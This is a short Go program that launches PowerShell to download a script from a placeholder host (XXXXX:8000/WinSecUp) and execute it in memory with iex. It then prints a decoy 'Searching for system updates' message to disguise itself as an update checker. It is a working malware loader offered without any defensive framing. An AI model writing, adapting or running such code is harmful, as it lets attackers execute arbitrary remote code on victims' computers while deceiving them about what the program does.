package main

import (
	"fmt"
	"os/exec"
)

func main() {
	fun := "powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('http://XXXXX:8000/WinSecUp')\""
	cmd := exec.Command("powershell", "-NOp", fun)
	err := cmd.Run()
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("Searching for system updates")
}
